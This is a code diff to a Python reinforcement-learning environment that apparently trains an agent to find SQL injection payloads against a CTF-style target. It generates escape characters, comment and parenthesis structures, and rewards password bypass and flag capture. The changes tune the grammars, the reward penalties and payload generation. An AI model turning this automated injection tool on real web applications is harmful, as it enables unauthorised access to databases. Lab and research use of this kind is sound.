@@ -32,7 +32,7 @@ COMMENT -> "-- " | "# " | "/* "
 sql_grammar_phase2 = """
 S -> ESC_COMMENT | CLOSE_PAREN COMMENT
 ESC_COMMENT -> COMMENT
-CLOSE_PAREN -> ")" | "))" | ")))" | "))))" | "))))))"
+CLOSE_PAREN -> ")" | "))" | ")))" | "))))" | ")))))"
 COMMENT -> "-- " | "# " | "/* "
 """
 
@@ -67,7 +67,7 @@ class SQLiEnv(gym.Env):
         self.found_parenthesis_structure = False  # Flag for finding the parenthesis structure
         self.parentheses_structure = ""  # Store the valid parenthesis structure
         self.step_count = 0  # Track the number of steps in the current episode
-        self.max_steps_per_episode = 10000  # Maximum steps per episode
+        self.max_steps_per_episode = 5000  # Maximum steps per episode
 
         # Define the action and observation spaces
         self.action_space = spaces.Box(low=0, high=1, shape=(10,), dtype=np.float32)
@@ -78,6 +78,11 @@ class SQLiEnv(gym.Env):
         self.session = requests.Session()
         retries = Retry(total=5, backoff_factor=0.1)
         self.session.mount("http://", HTTPAdapter(max_retries=retries))
+
+        # Pre-generate sequences
+        self.phase1_sequences = list(generate(cfg_phase1, n=10))
+        self.phase2_sequences = list(generate(cfg_phase2, n=10))
+        self.phase3_sequences = list(generate(cfg_phase3, n=10))
 
     def generate_payload(self, phase: int, action: ArrayLike) -> str:
         """
@@ -91,15 +96,15 @@ class SQLiEnv(gym.Env):
 
         if phase == 1:
             # Phase 1: Finding the escape character and comment type
-            grammar = cfg_phase1
-            action_index = int(action[0] * (len(list(generate(grammar, n=10))) - 1))
-            payload = ' '.join(list(generate(grammar, n=10))[action_index])
+            grammar = self.phase1_sequences
+            action_index = int(action[0] * (len(grammar) - 1))
+            payload = ' '.join(grammar[action_index])
 
         elif phase == 2:
             # Phase 2: Finding the valid parentheses structure
-            grammar = cfg_phase2
-            action_index = int(action[0] * (len(list(generate(grammar, n=10))) - 1))
-            parenthesis_payload = ' '.join(list(generate(grammar, n=10))[action_index])
+            grammar = self.phase2_sequences
+            action_index = int(action[0] * (len(grammar) - 1))
+            parenthesis_payload = ' '.join(grammar[action_index])
             if "ESC_COMMENT" in parenthesis_payload:
                 payload = f"{self.exploit_char} {parenthesis_payload.split()[1]}"
             else:
@@ -107,9 +112,9 @@ class SQLiEnv(gym.Env):
 
         else:
             # Phase 3: Crafting the full SQL injection payload
-            grammar = cfg_phase3
-            action_index = int(action[0] * (len(list(generate(grammar, n=10))) - 1))
-            clause = ' '.join(list(generate(grammar, n=10))[action_index])
+            grammar = self.phase3_sequences
+            action_index = int(action[0] * (len(grammar) - 1))
+            clause = ' '.join(grammar[action_index])
 
             # Extract parentheses and comment part from the stored parentheses_structure
             match = re.search(r"(\)+)\s*(--|#|/\*)", self.parentheses_structure)
@@ -120,7 +125,7 @@ class SQLiEnv(gym.Env):
                 parts = clause.split()
 
                 # Identify CFG tokens by parsing the grammar
-                cfg_tokens = self.extract_tokens_from_grammar(grammar)
+                cfg_tokens = self.extract_tokens_from_grammar(cfg_phase3)
 
                 # Determine valid insertion points for parentheses, avoiding CFG tokens
                 valid_insertion_points = self.get_valid_insertion_points(parts, cfg_tokens)
@@ -142,7 +147,6 @@ class SQLiEnv(gym.Env):
                     for i, index in enumerate(split_indices):
                         if index < len(valid_insertion_points):
                             parts.insert(valid_insertion_points[index] + i, ')')
-                            # Insert parentheses at chosen indices
 
                 clause_with_parentheses = ' '.join(parts)
                 payload = f"{self.exploit_char} {clause_with_parentheses}".strip()
@@ -246,6 +250,7 @@ class SQLiEnv(gym.Env):
 
         :return: A tuple containing the initial state and an empty dictionary.
         """
+        print(f"RESET flag found or max steps reached")
         self.exploit_char_found = False
         self.found_parenthesis_structure = False
         self.valid_structure = False
@@ -327,14 +332,14 @@ class SQLiEnv(gym.Env):
                 self.exploit_char = payload[0]  # Set the first character as the escape character
                 print(f"Exploit character found: {self.exploit_char}")
             else:
-                reward -= 300  # Penalty for crashing the server if we already found the exploit character
+                reward -= 500  # Penalty for crashing the server if we already found the exploit character
                 # (bad but ok because of the exploration)
 
         if space[1] == 0:
-            reward -= 150  # Penalty for not finding any data (bad)
+            reward -= 200  # Penalty for not finding any data (bad)
 
         if space[1] == 1 and space != [1, 1, 1]:
-            reward -= 50  # Small penalty for bypassing the password check but not the good one
+            reward -= 100  # Small penalty for bypassing the password check but not the good one
 
         if space == [1, 1, 1]:
             reward = -1  # High reward for finding the flag
